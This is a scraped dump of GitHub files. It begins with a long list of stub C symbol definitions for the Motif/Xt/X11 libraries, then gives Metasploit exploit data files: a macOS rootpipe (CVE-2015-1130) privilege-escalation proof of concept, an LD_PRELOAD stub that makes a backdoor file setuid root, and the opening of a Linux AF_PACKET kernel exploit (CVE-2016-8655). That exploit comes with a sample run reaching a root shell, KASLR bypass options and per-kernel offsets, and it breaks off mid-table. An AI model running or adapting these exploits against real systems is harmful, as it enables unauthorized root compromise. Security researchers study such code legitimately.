_XmTextSetHighlight = 0;\nint XmTextSetHighlight = 0;\nint XmTextSetInsertionPosition = 0;\nint XmTextSetMaxLength = 0;\nint _XmTextSetPreeditPosition = 0;\nint _XmTextSetSel2 = 0;\nint XmTextSetSelection = 0;\nint XmTextSetSource = 0;\nint XmTextSetString = 0;\nint XmTextSetStringWcs = 0;\nint _XmTextSetTopCharacter = 0;\nint XmTextSetTopCharacter = 0;\nint _XmTextShouldWordWrap = 0;\nint _XmTextShowPosition = 0;\nint XmTextShowPosition = 0;\nint _XmTextToggleCursorGC = 0;\nint _XmTextToLocaleText = 0;\nint _XmTextUpdateLineTable = 0;\nint _XmTextValidate = 0;\nint _XmTextValueChanged = 0;\nint xmTextWidgetClass = 0;\nint XmTextXYToPos = 0;\nint _XmToggleBCacheCompare = 0;\nint _XmToggleB_defaultTranslations = 0;\nint _XmToggleBGadClassExtRec = 0;\nint _XmToggleB_menuTranslations = 0;\nint _XmToggleBPrimClassExtRec = 0;\nint xmToggleButtonClassRec = 0;\nint xmToggleButtonGadgetClass = 0;\nint xmToggleButtonGadgetClassRec = 0;\nint XmToggleButtonGadgetGetState = 0;\nint XmToggleButtonGadgetSetState = 0;\nint XmToggleButtonGadgetSetValue = 0;\nint xmToggleButtonGCacheObjClassRec = 0;\nint XmToggleButtonGetState = 0;\nint XmToggleButtonSetState = 0;\nint XmToggleButtonSetValue = 0;\nint xmToggleButtonWidgetClass = 0;\nint _XmToHorizontalPixels = 0;\nint _XmToLayoutDirection = 0;\nint _XmToolTipEnter = 0;\nint XmToolTipGetLabel = 0;\nint _XmToolTipLeave = 0;\nint _XmToolTipRemove = 0;\nint _XmToPanedPixels = 0;\nint _XmTopShadowColorDefault = 0;\nint _XmTopShadowPixmapDefault = 0;\nint _XmToVerticalPixels = 0;\nint XmTrackingEvent = 0;\nint XmTrackingLocate = 0;\nint _XmTrackShellFocus = 0;\nint XmTransferDone = 0;\nint _XmTransferGetDestinationCBStruct = 0;\nint XmTransferSendRequest = 0;\nint XmTransferSetParameters = 0;\nint XmTransferStartRequest = 0;\nint XmTransferValue = 0;\nint _XmTransformSubResources = 0;\nint XmTranslateKey = 0;\nint _XmTraverse = 0;\nint _XmTraverseAway = 0;\nint _XmTraverseDown = 0;\nint _XmTraverseHome = 0;\nint _XmTraverseLeft = 0;\nint _XmTraverseNext = 0;\nint _XmTraverseNextTabGroup = 0;\nint _XmTraversePrev = 0;\nint _XmTraversePrevTabGroup = 0;\nint _XmTraverseRight = 0;\nint _XmTraverseUp = 0;\nint _XmTravGraphAdd = 0;\nint _XmTravGraphRemove = 0;\nint _XmTravGraphUpdate = 0;\nint xmTreeClassRec = 0;\nint xmTreeWidgetClass = 0;\nint XmuNCopyISOLatin1Lowered = 0;\nint _XmUnhighlightBorder = 0;\nint XmUninstallImage = 0;\nint _XmUnitTypeDefault = 0;\nint XmUpdateDisplay = 0;\nint _XmUseColorObj = 0;\nint xmUseVersion = 0;\nint _XmUtf8ToUcs2 = 0;\nint _XmUtilIsSubclassByNameQ = 0;\nint XmVaCreateArrowButton = 0;\nint XmVaCreateArrowButtonGadget = 0;\nint XmVaCreateBulletinBoard = 0;\nint XmVaCreateButtonBox = 0;\nint XmVaCreateCascadeButton = 0;\nint XmVaCreateCascadeButtonGadget = 0;\nint XmVaCreateColorSelector = 0;\nint XmVaCreateColumn = 0;\nint XmVaCreateCombinationBox2 = 0;\nint XmVaCreateComboBox = 0;\nint XmVaCreateCommand = 0;\nint XmVaCreateContainer = 0;\nint XmVaCreateDataField = 0;\nint XmVaCreateDrawingArea = 0;\nint XmVaCreateDrawnButton = 0;\nint XmVaCreateDropDown = 0;\nint XmVaCreateExt18List = 0;\nint XmVaCreateFileSelectionBox = 0;\nint XmVaCreateForm = 0;\nint XmVaCreateFrame = 0;\nint XmVaCreateIconGadget = 0;\nint XmVaCreateLabel = 0;\nint XmVaCreateLabelGadget = 0;\nint XmVaCreateList = 0;\nint XmVaCreateMainWindow = 0;\nint XmVaCreateManagedArrowButton = 0;\nint XmVaCreateManagedArrowButtonGadget = 0;\nint XmVaCreateManagedBulletinBoard = 0;\nint XmVaCreateManagedButtonBox = 0;\nint XmVaCreateManagedCascadeButton = 0;\nint XmVaCreateManagedCascadeButtonGadget = 0;\nint XmVaCreateManagedColorSelector = 0;\nint XmVaCreateManagedColumn = 0;\nint XmVaCreateManagedCombinationBox2 = 0;\nint XmVaCreateManagedComboBox = 0;\nint XmVaCreateManagedCommand = 0;\nint XmVaCreateManagedContainer = 0;\nint XmVaCreateManagedDataField = 0;\nint XmVaCreateManagedDrawingArea = 0;\nint XmVaCreateManagedDrawnButton = 0;\nint XmVaCreateManagedDropDown = 0;\nint XmVaCreateManagedExt18List = 0;\nint XmVaCreateManagedFileSelectionBox = 0;\nint XmVaCreateManagedForm = 0;\nint XmVaCreateManagedFrame = 0;\nint XmVaCreateManagedIconGadget = 0;\nint XmVaCreateManagedLabel = 0;\nint XmVaCreateManagedLabelGadget = 0;\nint XmVaCreateManagedList = 0;\nint XmVaCreateManagedMainWindow = 0;\nint XmVaCreateManagedMessageBox = 0;\nint XmVaCreateManagedMultiList = 0;\nint XmVaCreateManagedNotebook = 0;\nint XmVaCreateManagedPanedWindow = 0;\nint XmVaCreateManagedPushButton = 0;\nint XmVaCreateManagedPushButtonGadget = 0;\nint XmVaCreateManagedRowColumn = 0;\nint XmVaCreateManagedScale = 0;\nint XmVaCreateManagedScrollBar = 0;\nint XmVaCreateManagedScrolledWindow = 0;\nint XmVaCreateManagedSelectionBox = 0;\nint XmVaCreateManagedSeparator = 0;\nint XmVaCreateManagedSeparatorGadget = 0;\nint XmVaCreateManagedSimpleSpinBox = 0;\nint XmVaCreateManagedSpinBox = 0;\nint XmVaCreateManagedTabStack = 0;\nint XmVaCreateManagedText = 0;\nint XmVaCreateManagedTextField = 0;\nint XmVaCreateManagedToggleButton = 0;\nint XmVaCreateManagedToggleButtonGadget = 0;\nint XmVaCreateMessageBox = 0;\nint XmVaCreateMultiList = 0;\nint XmVaCreateNotebook = 0;\nint XmVaCreatePanedWindow = 0;\nint XmVaCreatePushButton = 0;\nint XmVaCreatePushButtonGadget = 0;\nint XmVaCreateRowColumn = 0;\nint XmVaCreateScale = 0;\nint XmVaCreateScrollBar = 0;\nint XmVaCreateScrolledWindow = 0;\nint XmVaCreateSelectionBox = 0;\nint XmVaCreateSeparator = 0;\nint XmVaCreateSeparatorGadget = 0;\nint XmVaCreateSimpleCheckBox = 0;\nint XmVaCreateSimpleMenuBar = 0;\nint XmVaCreateSimpleOptionMenu = 0;\nint XmVaCreateSimplePopupMenu = 0;\nint XmVaCreateSimplePulldownMenu = 0;\nint XmVaCreateSimpleRadioBox = 0;\nint XmVaCreateSimpleSpinBox = 0;\nint XmVaCreateSpinBox = 0;\nint XmVaCreateTabStack = 0;\nint XmVaCreateText = 0;\nint XmVaCreateTextField = 0;\nint XmVaCreateToggleButton = 0;\nint XmVaCreateToggleButtonGadget = 0;\nint _XmValidateFocus = 0;\nint _XmValidCursorIconQuark = 0;\nint _XmValidTimestamp = 0;\nint _XmVaToTypedArgList = 0;\nint _XmVendorExtRealize = 0;\nint xmVendorShellExtClassRec = 0;\nint xmVendorShellExtObjectClass = 0;\nint _XmVersionString = 0;\nint _XmVirtKeys_acornFallbackBindingString = 0;\nint _XmVirtKeys_apolloFallbackBindingString = 0;\nint _XmVirtKeys_dblclkFallbackBindingString = 0;\nint _XmVirtKeys_decFallbackBindingString = 0;\nint _XmVirtKeysDestroy = 0;\nint _XmVirtKeys_dgFallbackBindingString = 0;\nint _XmVirtKeys_fallbackBindingString = 0;\nint _XmVirtKeysHandler = 0;\nint _XmVirtKeys_hpFallbackBindingString = 0;\nint _XmVirtKeys_ibmFallbackBindingString = 0;\nint _XmVirtKeys_ingrFallbackBindingString = 0;\nint _XmVirtKeysInitialize = 0;\nint _XmVirtKeysLoadFallbackBindings = 0;\nint _XmVirtKeysLoadFileBindings = 0;\nint _XmVirtKeys_megatekFallbackBindingString = 0;\nint _XmVirtKeys_motorolaFallbackBindingString = 0;\nint _XmVirtKeys_sgiFallbackBindingString = 0;\nint _XmVirtKeys_siemens9733FallbackBindingString = 0;\nint _XmVirtKeys_siemensWx200FallbackBindingString = 0;\nint _XmVirtKeys_sunFallbackBindingString = 0;\nint _XmVirtKeys_tekFallbackBindingString = 0;\nint _XmVirtualToActualKeysym = 0;\nint _XmWarning = 0;\nint _XmWarningMsg = 0;\nint _XmWhitePixel = 0;\nint _XmWidgetFocusChange = 0;\nint XmWidgetGetBaselines = 0;\nint XmWidgetGetDisplayRect = 0;\nint _XmWidgetIsTraversable = 0;\nint xmWorldClass = 0;\nint xmWorldClassRec = 0;\nint xmWorldObjectClass = 0;\nint _XmWriteDragBuffer = 0;\nint _XmWriteDSToStream = 0;\nint _XmWriteInitiatorInfo = 0;\nint _XmXftDrawCreate = 0;\nint _XmXftDrawDestroy = 0;\nint _XmXftDrawString = 0;\nint _XmXftDrawString2 = 0;\nint _XmXftFontAverageWidth = 0;\nint _XmXftGetXftColor = 0;\nint _XmXftSetClipRectangles = 0;\nint _Xmxpmatoui = 0;\nint _XmxpmColorKeys = 0;\nint _XmxpmCreateImageFromPixmap = 0;\nint _XmxpmCreatePixmapFromImage = 0;\nint _XmxpmDataTypes = 0;\nint _XmxpmFreeColorTable = 0;\nint _XmxpmFreeRgbNames = 0;\nint _XmxpmGetCmt = 0;\nint _XmxpmGetRgbName = 0;\nint _XmxpmGetString = 0;\nint _XmxpmHashIntern = 0;\nint _XmxpmHashSlot = 0;\nint _XmxpmHashTableFree = 0;\nint _XmxpmHashTableInit = 0;\nint _XmxpmInitAttributes = 0;\nint _XmxpmInitXpmImage = 0;\nint _XmxpmInitXpmInfo = 0;\nint _XmxpmNextString = 0;\nint _XmxpmNextUI = 0;\nint _XmxpmNextWord = 0;\nint _XmxpmParseColors = 0;\nint _XmxpmParseData = 0;\nint _XmxpmParseDataAndCreate = 0;\nint _XmxpmParseExtensions = 0;\nint _XmxpmParseHeader = 0;\nint _XmxpmParseValues = 0;\nint _XmxpmReadRgbNames = 0;\nint _XmxpmSetAttributes = 0;\nint _XmxpmSetInfo = 0;\nint _XmxpmSetInfoMask = 0;\nint _Xmxpm_xynormalizeimagebits = 0;\nint _Xmxpm_znormalizeimagebits = 0;\nint XNextEvent = 0;\nint XOffsetRegion = 0;\nint XOMOfOC = 0;\nint XOpenDisplay = 0;\nint XOpenIM = 0;\nint XParseColor = 0;\nint XPeekEvent = 0;\nint XPending = 0;\nint Xpms_popen = 0;\nint XPolygonRegion = 0;\nint XPutBackEvent = 0;\nint XPutImage = 0;\nint XQueryBestCursor = 0;\nint XQueryColor = 0;\nint XQueryColors = 0;\nint XQueryPointer = 0;\nint XQueryTree = 0;\nint XRaiseWindow = 0;\nint XReadBitmapFileData = 0;\nint XRecolorCursor = 0;\nint XRectInRegion = 0;\nint XReparentWindow = 0;\nint XrmCombineDatabase = 0;\nint XrmDestroyDatabase = 0;\nint XrmGetStringDatabase = 0;\nint XrmPermStringToQuark = 0;\nint XrmPutResource = 0;\nint XrmPutStringResource = 0;\nint XrmQGetResource = 0;\nint XrmQGetSearchList = 0;\nint XrmQGetSearchResource = 0;\nint XrmQuarkToString = 0;\nint XrmStringToQuark = 0;\nint XrmUniqueQuark = 0;\nint XRotateBuffers = 0;\nint XSaveContext = 0;\nint XScreenCount = 0;\nint XScreenNumberOfScreen = 0;\nint XScreenOfDisplay = 0;\nint XSelectInput = 0;\nint XSendEvent = 0;\nint XSetClipMask = 0;\nint XSetClipOrigin = 0;\nint XSetClipRectangles = 0;\nint XSetCloseDownMode = 0;\nint XSetErrorHandler = 0;\nint XSetFillStyle = 0;\nint XSetForeground = 0;\nint XSetFunction = 0;\nint XSetICFocus = 0;\nint XSetICValues = 0;\nint XSetInputFocus = 0;\nint XSetLineAttributes = 0;\nint XSetLocaleModifiers = 0;\nint XSetOCValues = 0;\nint XSetRegion = 0;\nint XSetSelectionOwner = 0;\nint XSetStipple = 0;\nint XSetTextProperty = 0;\nint XSetTSOrigin = 0;\nint XSetWindowBackground = 0;\nint XSetWindowBackgroundPixmap = 0;\nint XSetWMColormapWindows = 0;\nint XShapeCombineMask = 0;\nint XShapeCombineRectangles = 0;\nint XShapeQueryExtension = 0;\nint __xstat64 = 0;\nint XStoreBuffer = 0;\nint XStoreColor = 0;\nint XStringToKeysym = 0;\nint XSubtractRegion = 0;\nint XSync = 0;\nint XtAddCallback = 0;\nint XtAddEventHandler = 0;\nint XtAddGrab = 0;\nint XtAddRawEventHandler = 0;\nint XtAllocateGC = 0;\nint XtAppAddTimeOut = 0;\nint XtAppAddWorkProc = 0;\nint XtAppCreateShell = 0;\nint XtAppErrorMsg = 0;\nint XtAppGetExitFlag = 0;\nint XtAppGetSelectionTimeout = 0;\nint XtAppLock = 0;\nint XtAppNextEvent = 0;\nint XtAppPending = 0;\nint XtAppProcessEvent = 0;\nint XtAppSetSelectionTimeout = 0;\nint XtAppSetTypeConverter = 0;\nint XtAppSetWarningMsgHandler = 0;\nint XtAppUnlock = 0;\nint XtAppWarningMsg = 0;\nint XtAugmentTranslations = 0;\nint XtBuildEventMask = 0;\nint XtCallActionProc = 0;\nint XtCallCallbackList = 0;\nint XtCallCallbacks = 0;\nint XtCallConverter = 0;\nint XtCalloc = 0;\nint XtCancelSelectionRequest = 0;\nint XtConfigureWidget = 0;\nint XtConvertAndStore = 0;\nint XtConvertCase = 0;\nint XtCreateManagedWidget = 0;\nint XtCreatePopupShell = 0;\nint XtCreateSelectionRequest = 0;\nint XtCreateWidget = 0;\nint XtCreateWindow = 0;\nint XtCvtStringToFontSet = 0;\nint XtCvtStringToFontStruct = 0;\nint XtCvtStringToPixel = 0;\nint XtDatabase = 0;\nint XtDestroyApplicationContext = 0;\nint XtDestroyWidget = 0;\nint XtDisownSelection = 0;\nint XtDispatchEvent = 0;\nint XtDisplayOfObject = 0;\nint XtDisplayStringConversionWarning = 0;\nint XtDisplayToApplicationContext = 0;\nint XtError = 0;\nint XtErrorMsg = 0;\nint XTextExtents = 0;\nint XTextExtents16 = 0;\nint XTextWidth = 0;\nint XTextWidth16 = 0;\nint XtFree = 0;\nint XtGetActionKeysym = 0;\nint XtGetApplicationNameAndClass = 0;\nint XtGetApplicationResources = 0;\nint XtGetConstraintResourceList = 0;\nint XtGetErrorDatabaseText = 0;\nint XtGetGC = 0;\nint XtGetKeysymTable = 0;\nint XtGetMultiClickTime = 0;\nint XtGetResourceList = 0;\nint XtGetSelectionParameters = 0;\nint XtGetSelectionRequest = 0;\nint XtGetSelectionValue = 0;\nint XtGetSelectionValueIncremental = 0;\nint XtGetSelectionValues = 0;\nint XtGetSelectionValuesIncremental = 0;\nint XtGetSubresources = 0;\nint XtGetSubvalues = 0;\nint XtGetValues = 0;\nint XtGrabButton = 0;\nint XtGrabKey = 0;\nint XtGrabKeyboard = 0;\nint XtGrabPointer = 0;\nint XtHasCallbacks = 0;\nint _XtInherit = 0;\nint _XtInheritTranslations = 0;\nint XtInitializeWidgetClass = 0;\nint XtInsertEventHandler = 0;\nint XtInstallAccelerators = 0;\nint XtIsManaged = 0;\nint XtIsSensitive = 0;\nint XtIsSubclass = 0;\nint _XtIsSubclassOf = 0;\nint XtLastEventProcessed = 0;\nint XtLastTimestampProcessed = 0;\nint XtMakeGeometryRequest = 0;\nint XtMakeResizeRequest = 0;\nint XtMalloc = 0;\nint XtManageChild = 0;\nint XtManageChildren = 0;\nint XtMergeArgLists = 0;\nint XtMoveWidget = 0;\nint XtName = 0;\nint XtNameToWidget = 0;\nint XtOverrideTranslations = 0;\nint XtOwnSelection = 0;\nint XtOwnSelectionIncremental = 0;\nint XtParseAcceleratorTable = 0;\nint XtParseTranslationTable = 0;\nint XtPopdown = 0;\nint XtPopup = 0;\nint XtProcessLock = 0;\nint XtProcessUnlock = 0;\nint XtQueryGeometry = 0;\nint XTranslateCoordinates = 0;\nint XtRealizeWidget = 0;\nint XtRealloc = 0;\nint XtRegisterGrabAction = 0;\nint XtReleaseGC = 0;\nint XtRemoveAllCallbacks = 0;\nint XtRemoveCallback = 0;\nint XtRemoveEventHandler = 0;\nint XtRemoveGrab = 0;\nint XtRemoveTimeOut = 0;\nint XtRemoveWorkProc = 0;\nint XtResizeWidget = 0;\nint XtResolvePathname = 0;\nint XtScreenDatabase = 0;\nint XtScreenOfObject = 0;\nint XtSendSelectionRequest = 0;\nint XtSetKeyboardFocus = 0;\nint XtSetKeyTranslator = 0;\nint XtSetMappedWhenManaged = 0;\nint XtSetSelectionParameters = 0;\nint XtSetSensitive = 0;\nint XtSetSubvalues = 0;\nint XtSetTypeConverter = 0;\nint XtSetValues = 0;\nint XtShellStrings = 0;\nint XtStrings = 0;\nint XtTranslateCoords = 0;\nint XtTranslateKey = 0;\nint XtUngrabButton = 0;\nint XtUngrabKey = 0;\nint XtUngrabKeyboard = 0;\nint XtUngrabPointer = 0;\nint XtUnmanageChild = 0;\nint XtUnmanageChildren = 0;\nint XtVaCreateManagedWidget = 0;\nint XtVaCreateWidget = 0;\nint XtVaGetValues = 0;\nint XtVaSetValues = 0;\nint XtWarning = 0;\nint XtWarningMsg = 0;\nint XtWidgetToApplicationContext = 0;\nint XtWindowOfObject = 0;\nint XtWindowToWidget = 0;\nint XUngrabKeyboard = 0;\nint XUngrabPointer = 0;\nint XUngrabServer = 0;\nint XUnionRectWithRegion = 0;\nint XUnionRegion = 0;\nint XUnmapWindow = 0;\nint XUnsetICFocus = 0;\nint Xutf8DrawImageString = 0;\nint Xutf8DrawString = 0;\nint Xutf8TextEscapement = 0;\nint Xutf8TextExtents = 0;\nint Xutf8TextListToTextProperty = 0;\nint XVaCreateNestedList = 0;\nint XWarpPointer = 0;\nint XwcDrawImageString = 0;\nint XwcDrawString = 0;\nint XwcTextEscapement = 0;\nint XwcTextExtents = 0;\nint XWidthOfScreen = 0;\nint XWindowEvent = 0;\nint XWithdrawWindow = 0;\nint overrideShellWidgetClass = 0;\n", "timestamp": "2025-10-24T23:39:29.789787"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2015-1130/exploit.py", "content": "########################################################\n#\n#  PoC exploit code for rootpipe (CVE-2015-1130)\n#\n#  Created by Emil Kvarnhammar, TrueSec\n#\n#  Tested on OS X 10.7.5, 10.8.2, 10.9.5 and 10.10.2\n#\n########################################################\nimport os\nimport sys\nimport platform\nimport re\nimport ctypes\nimport objc\nimport sys\nfrom Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions\nfrom Foundation import NSAutoreleasePool\n\ndef load_lib(append_path):\n    return ctypes.cdll.LoadLibrary(\"/System/Library/PrivateFrameworks/\" + append_path);\n\ndef use_old_api():\n    return re.match(\"^(10.7|10.8)(.\\d)?$\", platform.mac_ver()[0])\n\n\nargs = sys.argv\n\nif len(args) != 3:\n    print(\"usage: exploit.py source_binary dest_binary_as_root\")\n    sys.exit(-1)\n\nsource_binary = args[1]\ndest_binary = os.path.realpath(args[2])\n\nif not os.path.exists(source_binary):\n    raise Exception(\"file does not exist!\")\n\npool = NSAutoreleasePool.alloc().init()\n\nattr = NSMutableDictionary.alloc().init()\nattr.setValue_forKey_(04777, NSFilePosixPermissions)\ndata = NSData.alloc().initWithContentsOfFile_(source_binary)\n\nprint(\"will write file\", dest_binary)\n\nif use_old_api():\n    adm_lib = load_lib(\"/Admin.framework/Admin\")\n    Authenticator = objc.lookUpClass(\"Authenticator\")\n    ToolLiaison = objc.lookUpClass(\"ToolLiaison\")\n    SFAuthorization = objc.lookUpClass(\"SFAuthorization\")\n\n    authent = Authenticator.sharedAuthenticator()\n    authref = SFAuthorization.authorization()\n\n    # authref with value nil is not accepted on OS X <= 10.8\n    authent.authenticateUsingAuthorizationSync_(authref)\n    st = ToolLiaison.sharedToolLiaison()\n    tool = st.tool()\n    tool.createFileWithContents_path_attributes_(data, dest_binary, attr)\nelse:\n    adm_lib = load_lib(\"/SystemAdministration.framework/SystemAdministration\")\n    WriteConfigClient = objc.lookUpClass(\"WriteConfigClient\")\n    client = WriteConfigClient.sharedClient()\n    client.authenticateUsingAuthorizationSync_(None)\n    tool = client.remoteProxy()\n\n    tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)\n\n\nprint(\"Done!\")\n\ndel pool\n", "timestamp": "2025-10-24T23:39:30.141129"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2016-1240/privesc_preload.c", "content": "#define _GNU_SOURCE\n#include <stdio.h>\n#include <sys/stat.h>\n#include <unistd.h>\n#include <dlfcn.h>\nuid_t geteuid(void) {\n\tstatic uid_t  (*old_geteuid)();\n\told_geteuid = dlsym(RTLD_NEXT, \"geteuid\");\n\tif ( old_geteuid() == 0 ) {\n\t\tchown(\"$BACKDOORPATH\", 0, 0);\n\t\tchmod(\"$BACKDOORPATH\", 04777);\n\t\tunlink(\"/etc/ld.so.preload\");\n\t}\n\treturn old_geteuid();\n}", "timestamp": "2025-10-24T23:39:30.473186"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/CVE-2016-8655/chocobo_root.c", "content": "/*\nchocobo_root.c\nlinux AF_PACKET race condition exploit for CVE-2016-8655.\nIncludes KASLR and SMEP bypasses. No SMAP bypass.\nFor Ubuntu 14.04 / 16.04 (x86_64) kernels 4.4.0 before 4.4.0-53.74.\nAll kernel offsets have been tested on Ubuntu / Linux Mint.\n\nvroom vroom\n*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\nuser@ubuntu:~$ uname -a\nLinux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux\nuser@ubuntu:~$ id\nuid=1000(user) gid=1000(user) groups=1000(user)\nuser@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread -Wall\nuser@ubuntu:~$ ./chocobo_root\nlinux AF_PACKET race condition exploit by rebel\nkernel version: 4.4.0-51-generic #72\nproc_dostring = 0xffffffff81088090\nmodprobe_path = 0xffffffff81e48f80\nregister_sysctl_table = 0xffffffff812879a0\nset_memory_rw = 0xffffffff8106f320\nexploit starting\nmaking vsyscall page writable..\n\nnew exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000\nsockets allocated\nremoving barrier and spraying..\nversion switcher stopping, x = -1 (y = 174222, last val = 2)\ncurrent packet version = 0\npbd->hdr.bh1.offset_to_first_pkt = 48\n*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\nplease wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\nclosing socket and verifying.......\nvsyscall page altered!\n\n\nstage 1 completed\nregistering new sysctl..\n\nnew exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850\nsockets allocated\nremoving barrier and spraying..\nversion switcher stopping, x = -1 (y = 30773, last val = 0)\ncurrent packet version = 2\npbd->hdr.bh1.offset_to_first_pkt = 48\nrace not won\n\nretrying stage..\nnew exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850\nsockets allocated\nremoving barrier and spraying..\nversion switcher stopping, x = -1 (y = 133577, last val = 2)\ncurrent packet version = 0\npbd->hdr.bh1.offset_to_first_pkt = 48\n*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\nplease wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\nclosing socket and verifying.......\nsysctl added!\n\nstage 2 completed\nbinary executed by kernel, launching rootshell\nroot@ubuntu:~# id\nuid=0(root) gid=0(root) groups=0(root),1000(user)\n\n*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=\n\nShoutouts to:\njsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)\nmcdelivery for delivering hotcakes and coffee\n\n11/2016\nby rebel\n---\nUpdated by <bcoles@gmail.com>\n- check number of CPU cores\n- KASLR bypasses\n- additional kernel targets\nhttps://github.com/bcoles/kernel-exploits/tree/master/CVE-2016-8655\n*/\n\n#define _GNU_SOURCE\n\n#include <fcntl.h>\n#include <poll.h>\n#include <pthread.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <linux/if_packet.h>\n#include <netinet/in.h>\n#include <sys/klog.h>\n#include <sys/mman.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <sys/stat.h>\n#include <sys/syscall.h>\n#include <sys/sysinfo.h>\n#include <sys/utsname.h>\n#include <sys/wait.h>\n\n#define DEBUG\n\n#ifdef DEBUG\n#  define dprintf printf\n#else\n#  define dprintf\n#endif\n\n#define ENABLE_SYSTEM_CHECKS\t\t1\n#define ENABLE_KASLR_BYPASS\t\t1\n\n#if ENABLE_KASLR_BYPASS\n#  define KERNEL_BASE_MIN\t\t0xffffffff00000000ul\n#  define KERNEL_BASE_MAX\t\t0xffffffffff000000ul\n#  define ENABLE_KASLR_BYPASS_KALLSYMS\t1\n#  define ENABLE_KASLR_BYPASS_SYSLOG\t1\n#  define ENABLE_KASLR_BYPASS_MINCORE\t1\n#endif\n\n// Will be overwritten if ENABLE_KASLR_BYPASS is enabled (1)\nunsigned long KERNEL_BASE = 0xffffffff81000000ul;\n\n// Will be overwritten by detect_versions()\nint kernel = -1;\n\n// New sysctl path\nconst char *SYSCTL_NAME = \"hack\";\nconst char *SYSCTL_PATH = \"/proc/sys/hack\";\n\nvolatile int barrier = 1;\nvolatile int vers_switcher_done = 0;\n\n// kernel target struct\nstruct kernel_info {\n    char *kernel_version;\n    unsigned long proc_dostring;\n    unsigned long modprobe_path;\n    unsigned long register_sysctl_table;\n    unsigned long set_memory_rw;\n};\n\n// Targets\nstruct kernel_info kernels[] = {\n    { \"4.4.0-21-generic #37~14.04.1-Ubuntu\", 0x084220, 0xc4b000, 0x273a30, 0x06b9d0 },\n    { \"4.4.0-22-generic #40~14.04.1-Ubuntu\", 0x084250, 0xc4b080, 0x273de0, 0x06b9d0 },\n    { \"4.4.0-24-generic #43~14.04.1-Ubuntu\", 0x084120, 0xc4b080, 0x2736f0, 0x06b880 },\n    { \"4.4.0-28-generic #47~14.04.1-Ubuntu\", 0x084160, 0xc4b100, 0x273b70, 0x06b880 },\n    { \"4.4.0-31-generic #50~14.04.1-Ubuntu\", 0x084160, 0xc4b100, 0x273c20, 0x06b880 },\n    { \"4.4.0-34-generic #53~14.04.1-Ubuntu\", 0x084160, 0xc4b100, 0x273c40, 0x06b880 },\n    { \"4.4.0-36-generic #55~14.04.1-Ubuntu\", 0x084160, 0xc4b100, 0x273c60, 0x06b890 },\n    { \"4.4.0-38-generic #57~14.04.1-Ubuntu\", 0x084210, 0xe4b100, 0x2742e0, 0x06b890 },\n    { \"4.4.0-42-generic #62~14.04.1-Ubuntu\", 0x084260, 0xe4b100, 0x274300, 0x06b880 },\n    { \"4.4.0-45-generic #66~14.04.1-Ubuntu\", 0x084260, 0xe4b100, 0x274340, 0x06b880 },\n    //{\"4.4.0-46-generic #67~14.04.1-Ubuntu\",0x0842f0,0xe4b100,0x274580,0x06b880},\n    { \"4.4.0-47-generic #68~14.04.1-Ubuntu\", 0x0842f0, 0xe4b100, 0x274580, 0x06b880 },\n    //{\"4.4.0-49-generic #70~14.04.1-Ubuntu\",0x084350,0xe4b100,0x274b10,0x06b880},\n    { \"4.4.0-51-generic #72~14.04.1-Ubuntu\", 0x084350, 0xe4b100, 0x274750, 0x06b880 },\n\n    { \"4.4.0-21-generic #37-Ubuntu\", 0x087cf0, 0xe48e80, 0x286310, 0x06f370 },\n    { \"4.4.0-22-generic #40-Ubuntu\", 0x087d40, 0xe48f00, 0x2864d0, 0x06f370 },\n    { \"4.4.0-24-generic #43-Ubuntu\", 0x087e60, 0xe48f00, 0x2868f0, 0x06f370 },\n    { \"4.4.0-28-generic #47-Ubuntu\", 0x087ea0, 0xe48f80, 0x286df0, 0x06f370 },\n    { \"4.4.0-31-generic #50-Ubuntu\", 0x087ea0, 0xe48f80, 0x286e90, 0x06f370 },\n    { \"4.4.0-34-generic #53-Ubuntu\", 0x087ea0, 0xe48f80, 0x286ed0, 0x06f370 },\n    { \"4.4.0-36-generic #55-Ubuntu\", 0x087ea0, 0xe48f80, 0x286e50, 0x06f360 },\n    { \"4.4.0-38-generic #57-Ubuntu\", 0x087f70, 0xe48f80, 0x287470, 0x06f360 },\n    { \"4.4.0-42-generic #62-Ubuntu\", 0x087fc0, 0xe48f80, 0x2874a0, 0x06f320 },\n    { \"4.4.0-43-generic #63-Ubuntu\", 0x087fc0, 0xe48f80, 0x2874b0, 0x06f320 },\n    { \"4.4.0-45-generic #66-Ubuntu\", 0x087fc0, 0xe48f80, 0x2874c0, 0x06f320 },\n    //{\"4.4.0-46-generic #67-Ubuntu\",0x088040,0xe48f80,0x287800,0x06f320},\n    { \"4.4.0-47-generic #68-Ubuntu\", 0x088040, 0xe48f80, 0x287800, 0x06f320 },\n    //{\"4.4.0-49-generic #70-Ubuntu\",0x088090,0xe48f80,0x287d40,0x06f320},\n    { \"4.4.0-51-generic #72-Ubuntu\", 0x088090, 0xe48f80, 0x2879a0, 0x06f320},\n\n    { \"4.4.0-21-lowlatency #37-Ubuntu\",  0x88960, 0xe48e80, 0x28c3a0, 0x6fae0 },\n    { \"4.4.0-22-lowlatency #40-Ubuntu\",  0x889c0, 0xe48f00, 0x28c570, 0x6fae0 },\n    { \"4.4.0-24-lowlatency #43-Ubuntu\",  0x88ae0, 0xe48f00, 